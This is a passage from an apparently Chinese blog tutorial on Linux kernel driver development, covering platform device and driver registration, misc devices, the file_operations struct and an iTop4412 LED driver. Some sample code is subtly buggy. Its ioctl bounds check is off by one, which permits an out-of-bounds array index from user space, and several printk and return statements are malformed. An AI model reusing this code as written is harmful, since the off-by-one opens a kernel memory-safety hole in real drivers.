class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">static  void hello_dev_release(struct device *dev)</span><br><span class="line">&#123;</span><br><span class="line">printk(&quot;hello_dev release&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">static struct platform_device hello_dev = &#123;</span><br><span class="line">.name = &quot;hello_name&quot;,   // device`s name</span><br><span class="line">.id = -1,</span><br><span class="line">.dev = &#123;</span><br><span class="line">.release = hello_dev_release,</span><br><span class="line">&#125;,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">//注册设备;</span><br><span class="line">static int __init device_init(void)</span><br><span class="line">&#123;</span><br><span class="line">int ret = 0;</span><br><span class="line">ret = platform_device_register(&amp;hello_dev);</span><br><span class="line">printk(KERN_WARNING &quot;platform_device_register ret = %d\n&quot;, ret);</span><br><span class="line"></span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">static void __exit device_exit(void)</span><br><span class="line">&#123;</span><br><span class="line"> platform_device_unregister(&amp;hello_dev);</span><br><span class="line"> printk(KERN_WARNING &quot;platform_device_register exit\n&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">module_init(device_init);</span><br><span class="line">module_exit(device_exit);</span><br></pre></td></tr></table></figure><p><a href="https://pan.baidu.com/s/1mhRrHk0" target="_blank" rel="noopener">完整源码</a></p><p><br></p><p><strong>方法三:(mknod)</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">　创建特殊文件。  </span><br><span class="line"></span><br><span class="line">　　mknod Name &#123; b | c &#125; Major Minor</span><br><span class="line"></span><br><span class="line">　　创建 FIFO（已命名的管道）</span><br><span class="line"></span><br><span class="line">　　mknod Name &#123; p &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">TYPE may be:</span><br><span class="line">  b      create a block (buffered) special file</span><br><span class="line">  c, u   create a character (unbuffered) special file</span><br><span class="line">  p      create a FIFO</span><br></pre></td></tr></table></figure><p>示例:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mknod /dev/input/mouse0  c  12  32</span><br></pre></td></tr></table></figure><p><br></p><h4 id="注册驱动到平台总线"><a href="#注册驱动到平台总线" class="headerlink" title="注册驱动到平台总线"></a><a href="https://pan.baidu.com/s/1i5EMDEX" target="_blank" rel="noopener">注册驱动到平台总线</a></h4><ul><li><code>platform_driver_register函数</code> 和 <code>platform_driver_unregister函数</code> 用于注册 和 卸载驱动。</li><li><code>platform_driver结构体</code></li></ul><ol><li><p>定义宏变量  <code>DRIVER_NAME  &quot;hello_ctl&quot;</code>  (注：  与注册hello设备时的名称相同。)</p></li><li><p>编写模块 <code>module_init</code>  <code>module_exit</code>  分别在其中注册 和 卸载驱动<code>platform_driver_register</code> <code>platform_driver_unregister</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> __<span class="function">init <span class="title">hello_init</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> DriverState = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">printk(KERN_WARNING <span class="string">"Welcome hello-module init\n"</span>);</span><br><span class="line"></span><br><span class="line">    DriverState = platform_driver_register(&amp;hello_driver);</span><br><span class="line"></span><br><span class="line">    printk(DRIVER_NAME <span class="string">"state = \t"</span>, DriverState);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">void</span> __<span class="function"><span class="built_in">exit</span> <span class="title">hello_exit</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">printk(KERN_WARNING <span class="string">"byebye hello-module exit\n"</span>);</span><br><span class="line">    </span><br><span class="line">    platform_driver_unregister(&amp;hello_driver);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//注册 并初始化模块</span></span><br><span class="line">module_init(hello_init)</span><br><span class="line"></span><br><span class="line"><span class="comment">//模块退出， 并关闭内存;</span></span><br><span class="line">module_exit(hello_exit)</span><br></pre></td></tr></table></figure><p>​</p></li><li><p>其中注册 和 卸载驱动函数的传入值为 <code>platform_driver</code> 类型， 即我们编写，将要实现的驱动程序。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">platform_driver</span> <span class="title">hello_driver</span> = </span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    .probe = &amp;hello_probe,</span><br><span class="line">    .remove = &amp;hello_remove,</span><br><span class="line">    .shutdown = &amp;hello_shutdown,</span><br><span class="line">    .suspend = &amp;hello_suspend,</span><br><span class="line">    .resume = &amp;hello_resume,</span><br><span class="line">    .driver = </span><br><span class="line">    &#123;</span><br><span class="line">        .name = DRIVER_NAME, <span class="comment">//设备注册- 查看 $itop_kernel/</span></span><br><span class="line">        .owner = THIS_MODULE,</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>其次定义并且实现 hello_driver;  此类型可查看 <a href="">驱动 platform_driver</a></p></li></ol><p><strong>问题:</strong> <code>probe_hello: disagrees about version of symbol module_layout</code>  </p><p>解决办法:</p><p>​    <code>uname -r</code>  查看系统内核版本， 同时查看 makefile 提供内核源码版本， 提供与系统内核版本对应一致的版本源码。</p><p><strong>注意:</strong></p><ol><li>先注册platform_driver结构体， 使用probe 注册杂项设备， 设置两个 name.  </li></ol><p>或者 </p><ol><li>在 module_init 中直接使用 misc_register 注册杂项设备, 其效果相同。</li></ol><p>如下:</p><ol><li><a href="https://pan.baidu.com/s/1nuNRKGL" target="_blank" rel="noopener">probe 示例源码</a></li><li><a href="https://pan.baidu.com/s/1pLoSduj" target="_blank" rel="noopener">misc 示例源码</a></li></ol><p><br></p><h4 id="设备节点"><a href="#设备节点" class="headerlink" title="设备节点"></a>设备节点</h4><p>杂项设备的主设备号是10， 在任何Linux系统中它都是固定的。</p><p><strong>杂项设备注册函数</strong>  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">include/linux/miscdevice.h</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">struct miscdevice  &#123;</span><br><span class="line">int minor;               // 设备号， 赋值为 MISC_DYNAMIC_MINOR  </span><br><span class="line">const char *name;        // 设备名称。</span><br><span class="line">const struct file_operations *fops; //file_operations 结构体。</span><br><span class="line">struct list_head list;</span><br><span class="line">struct device *parent;</span><br><span class="line">struct device *this_device;</span><br><span class="line">const char *nodename;</span><br><span class="line">mode_t mode;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">extern int misc_register(struct miscdevice * misc);</span><br><span class="line">extern int misc_deregister(struct miscdevice *misc);</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">extern int misc_register(struct miscdevice *misc);</span><br></pre></td></tr></table></figure><p>杂项设备注册函数； 一般在probe中调用，参数为<code>struct miscdevice</code> 。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">extern int misc_deregister(struct miscdevice *misc);</span><br></pre></td></tr></table></figure><p>杂项设备卸载函数；一般是在remove函数中用于卸载驱动。</p><p><a href="https://pan.baidu.com/s/1kVH02Jt" target="_blank" rel="noopener">完整代码</a>  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">static int __init hello_init(void)</span><br><span class="line">&#123;</span><br><span class="line">int miscstate = 0;</span><br><span class="line">//杂项设备；</span><br><span class="line">miscstate = misc_register(&amp;hello_device);// 区别: 不进行platform_match 匹配调用，直接注册设备。</span><br><span class="line">printk(KERN_WARNING &quot;misc_register = %d\n&quot;, miscstate);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">static void __exit hello_exit(void)</span><br><span class="line">&#123;</span><br><span class="line">printk(KERN_WARNING &quot;hello_device exit\n&quot;);</span><br><span class="line">misc_deregister(&amp;hello_device); //删除杂项设备;</span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">module_init(hello_init);</span><br><span class="line">module_exit(hello_exit);</span><br></pre></td></tr></table></figure><p><code>ls /dev/</code>   即可看到我们创建的杂项设备节点：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0 crw------- 1 root root 10, 55 Dec 20 00:00 hello_device_name</span><br></pre></td></tr></table></figure><p>即:  我们便可理解：设备节点，驱动名，设备名其实并无任何关系。</p><p><br></p><h4 id="Linux-file-operations结构体"><a href="#Linux-file-operations结构体" class="headerlink" title="Linux   file_operations结构体"></a>Linux  <a href="http://www.cnblogs.com/ZJoy/archive/2011/01/09/1931379.html" target="_blank" rel="noopener"> file_operations结构体</a></h4><p>file_operations 结构体的成员函数属于驱动设计的主体内容， 里面的函数和Linux系统给应用程序提供系统接口一一对应。</p><p>file_operations 结构体位于 <code>include/linux/fs.h</code>,  定义为:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * <span class="doctag">NOTE:</span></span></span><br><span class="line"><span class="comment"> * all file operations except setlease can be called without</span></span><br><span class="line"><span class="comment"> * the big kernel lock held in all filesystems.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">module</span> *<span class="title">owner</span>;</span>  <span class="comment">//一般是 THIS_MODULE</span></span><br><span class="line"><span class="keyword">loff_t</span> (*llseek) (struct file *, <span class="keyword">loff_t</span>, <span class="keyword">int</span>);</span><br><span class="line"><span class="keyword">ssize_t</span> (*read) (struct file *, <span class="keyword">char</span> __user *, <span class="keyword">size_t</span>, <span class="keyword">loff_t</span> *);</span><br><span class="line"><span class="keyword">ssize_t</span> (*write) (struct file *, <span class="keyword">const</span> <span class="keyword">char</span> __user *, <span class="keyword">size_t</span>, <span class="keyword">loff_t</span> *);</span><br><span class="line"><span class="keyword">ssize_t</span> (*aio_read) (struct kiocb *, <span class="keyword">const</span> struct iovec *, <span class="keyword">unsigned</span> <span class="keyword">long</span>, <span class="keyword">loff_t</span>);</span><br><span class="line"><span class="keyword">ssize_t</span> (*aio_write) (struct kiocb *, <span class="keyword">const</span> struct iovec *, <span class="keyword">unsigned</span> <span class="keyword">long</span>, <span class="keyword">loff_t</span>);</span><br><span class="line"><span class="keyword">int</span> (*readdir) (struct file *, <span class="keyword">void</span> *, <span class="keyword">filldir_t</span>);</span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="title">int</span> <span class="params">(*poll)</span> <span class="params">(struct file *, struct poll_table_struct *)</span></span>;</span><br><span class="line"><span class="comment">/* remove by cym 20130408 support for MT660.ko */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> 0</span></span><br><span class="line"><span class="comment">//#ifdef CONFIG_SMM6260_MODEM</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> 1<span class="comment">// liang, Pixtree also need to use ioctl interface...</span></span></span><br><span class="line"><span class="keyword">int</span> (*ioctl) (struct inode *, struct file *, <span class="keyword">unsigned</span> <span class="keyword">int</span>, <span class="keyword">unsigned</span> <span class="keyword">long</span>);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="comment">/* end remove */</span></span><br><span class="line"><span class="keyword">long</span> (*unlocked_ioctl) (struct file *, <span class="keyword">unsigned</span> <span class="keyword">int</span>, <span class="keyword">unsigned</span> <span class="keyword">long</span>);<span class="comment">//与写功能稍微重合,主要针对IO口的控制。</span></span><br><span class="line"><span class="keyword">long</span> (*compat_ioctl) (struct file *, <span class="keyword">unsigned</span> <span class="keyword">int</span>, <span class="keyword">unsigned</span> <span class="keyword">long</span>);</span><br><span class="line"><span class="keyword">int</span> (*mmap) (struct file *, struct vm_area_struct *);</span><br><span class="line"><span class="keyword">int</span> (*open) (struct inode *, struct file *);   <span class="comment">//对应上层的open函数。打开文件。</span></span><br><span class="line"><span class="keyword">int</span> (*flush) (struct file *, <span class="keyword">fl_owner_t</span> id);</span><br><span class="line"><span class="keyword">int</span> (*release) (struct inode *, struct file *); <span class="comment">//对应上层close函数，打开文件操作之后需要关闭。</span></span><br><span class="line"><span class="keyword">int</span> (*fsync) (struct file *, <span class="keyword">int</span> datasync);</span><br><span class="line"><span class="keyword">int</span> (*aio_fsync) (struct kiocb *, <span class="keyword">int</span> datasync);</span><br><span class="line"><span class="keyword">int</span> (*fasync) (<span class="keyword">int</span>, struct file *, <span class="keyword">int</span>);</span><br><span class="line"><span class="keyword">int</span> (*lock) (struct file *, <span class="keyword">int</span>, struct file_lock *);</span><br><span class="line"><span class="keyword">ssize_t</span> (*sendpage) (struct file *, struct page *, <span class="keyword">int</span>, <span class="keyword">size_t</span>, <span class="keyword">loff_t</span> *, <span class="keyword">int</span>);</span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="title">long</span> <span class="params">(*get_unmapped_area)</span><span class="params">(struct file *, <span class="keyword">unsigned</span> <span class="keyword">long</span>, <span class="keyword">unsigned</span> <span class="keyword">long</span>, <span class="keyword">unsigned</span> <span class="keyword">long</span>, <span class="keyword">unsigned</span> <span class="keyword">long</span>)</span></span>;</span><br><span class="line"><span class="keyword">int</span> (*check_flags)(<span class="keyword">int</span>);</span><br><span class="line"><span class="keyword">int</span> (*flock) (struct file *, <span class="keyword">int</span>, struct file_lock *);</span><br><span class="line"><span class="keyword">ssize_t</span> (*splice_write)(struct pipe_inode_info *, struct file *, <span class="keyword">loff_t</span> *, <span class="keyword">size_t</span>, <span class="keyword">unsigned</span> <span class="keyword">int</span>);</span><br><span class="line"><span class="keyword">ssize_t</span> (*splice_read)(struct file *, <span class="keyword">loff_t</span> *, struct pipe_inode_info *, <span class="keyword">size_t</span>, <span class="keyword">unsigned</span> <span class="keyword">int</span>);</span><br><span class="line"><span class="keyword">int</span> (*setlease)(struct file *, <span class="keyword">long</span>, struct file_lock **);</span><br><span class="line"><span class="keyword">long</span> (*fallocate)(struct file *file, <span class="keyword">int</span> mode, <span class="keyword">loff_t</span> offset,</span><br><span class="line">  <span class="keyword">loff_t</span> len);</span><br><span class="line"><span class="comment">/* add by cym 20130408 support for MT6260 and Pixtree */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> defined(CONFIG_SMM6260_MODEM) || defined(CONFIG_USE_GPIO_AS_I2C)</span></span><br><span class="line"><span class="keyword">int</span> (*ioctl) (struct inode *, struct file *, <span class="keyword">unsigned</span> <span class="keyword">int</span>, <span class="keyword">unsigned</span> <span class="keyword">long</span>);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="comment">/* end add */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><a href="https://pan.baidu.com/s/1pLHsaSV" target="_blank" rel="noopener">iTop4412_leds.c 源码</a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/init.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/kernel.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/fs.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;mach/gpio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;plat/gpio-cfg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/miscdevice.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/platform_device.h&gt;</span></span></span><br><span class="line"><span class="comment">//#include &lt;mach/gpio-bank.h&gt;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;mach/regs-gpio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;asm/io.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/regulator/consumer.h&gt;</span></span></span><br><span class="line"><span class="comment">//#include "gps.h"</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/delay.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LEDS_DEBUG</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> LEDS_DEBUG</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DPRINTK(x...) printk(<span class="meta-string">"LEDS_CTL DEBUG:"</span> x)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DPRINTK(x...)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DRIVER_NAME <span class="meta-string">"leds"</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span>  defined(CONFIG_CPU_TYPE_SCP_ELITE) || defined(CONFIG_CPU_TYPE_POP_ELITE) || defined(CONFIG_CPU_TYPE_POP2G_ELITE)</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> led_gpios[] = &#123;</span><br><span class="line">EXYNOS4_GPL2(<span class="number">0</span>),</span><br><span class="line">EXYNOS4_GPK1(<span class="number">1</span>),</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">elif</span> defined(CONFIG_CPU_TYPE_SCP_SUPPER) || defined(CONFIG_CPU_TYPE_POP_SUPPER) || defined(CONFIG_CPU_TYPE_POP2G_SUPPER)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> led_gpios[] = &#123;</span><br><span class="line">#<span class="keyword">if</span> defined(CONFIG_MTK_COMBO_COMM) || defined(CONFIG_MTK_COMBO_COMM_MODULE)</span><br><span class="line">EXYNOS4_GPC0(<span class="number">2</span>),</span><br><span class="line">#<span class="keyword">else</span></span><br><span class="line">EXYNOS4_GPX2(<span class="number">5</span>),</span><br><span class="line">#endif</span><br><span class="line">EXYNOS4_GPX0(<span class="number">1</span>),</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LED_NUMARRAY_SIZE(led_gpios) </span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">leds_open</span><span class="params">(struct inode *inode,struct file *filp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">DPRINTK(<span class="string">"Device Opened Success!\n"</span>);</span><br><span class="line"><span class="keyword">return</span> nonseekable_open(inode,filp);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">leds_release</span><span class="params">(struct inode *inode,struct file *filp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">DPRINTK(<span class="string">"Device Closed Success!\n"</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">leds_pm</span><span class="params">(<span class="keyword">bool</span> enable)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> ret = <span class="number">0</span>;</span><br><span class="line">printk(<span class="string">"debug: LEDS PM return %d\r\n"</span> , ret);</span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">leds_ioctl</span><span class="params">(struct file *file,<span class="keyword">unsigned</span> <span class="keyword">int</span> cmd,<span class="keyword">unsigned</span> <span class="keyword">long</span> arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">printk(<span class="string">"debug: leds_ioctl cmd is %d\n"</span> , cmd);</span><br><span class="line"></span><br><span class="line"><span class="keyword">switch</span>(cmd)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line"><span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line"><span class="keyword">if</span> (arg &gt; LED_NUM) &#123; <span class="comment">//LED_NUM =  2</span></span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">gpio_set_value(led_gpios[arg], cmd);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//rokcy 将系统调用 和 驱动程序关联起来的关键数据结构; </span></span><br><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> <span class="title">leds_ops</span> = &#123;</span></span><br><span class="line">.owner = THIS_MODULE, <span class="comment">// 指向拥有这个结构的模块指针;</span></span><br><span class="line">.open = leds_open, <span class="comment">//对设备文件进行的第一个操作;</span></span><br><span class="line">.release= leds_release, <span class="comment">//文件结构被释放时引用这个操作：</span></span><br><span class="line">.unlocked_ioctl = leds_ioctl,<span class="comment">//ioctl 